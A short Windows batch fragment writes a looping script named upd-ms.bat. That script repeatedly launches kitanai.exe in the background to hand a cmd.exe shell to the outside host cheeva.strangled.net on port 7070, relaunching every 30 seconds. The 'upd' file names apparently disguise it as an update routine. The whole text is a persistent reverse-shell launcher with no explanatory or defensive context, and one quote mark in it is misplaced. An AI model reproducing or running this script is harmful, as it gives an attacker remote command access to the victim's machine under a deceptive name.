:loop > D:\temp\ts\upd-ms.bat
start /B D:\temp\ts\kitanai.exe -t * -p "D:\temp\ts\upd.exe" -a cheeva.strangled.net 7070 -e cmd.exe" >> D:\temp\ts\upd-ms.bat
ping 127.0.0.1 -n 30 >nul >> D:\temp\ts\upd-ms.bat
goto loop >> D:\temp\ts\upd-ms.bat
